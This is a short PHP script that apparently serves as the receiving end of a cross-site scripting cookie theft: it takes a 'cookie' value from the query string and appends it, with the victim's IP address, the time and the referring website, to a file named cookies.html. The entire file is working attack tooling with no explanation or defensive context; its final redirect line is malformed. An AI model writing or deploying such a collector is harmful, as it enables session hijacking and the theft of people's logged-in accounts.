<?php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('l jS \of F Y h:i:s A');
$referer = $_SERVER['HTTP_REFERER'];
$fp = fopen('cookies.html', 'a');
fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Website: '.$referer.'<br><br><br>');
fclose($fp);
header ("javascript:history.back()");
?>
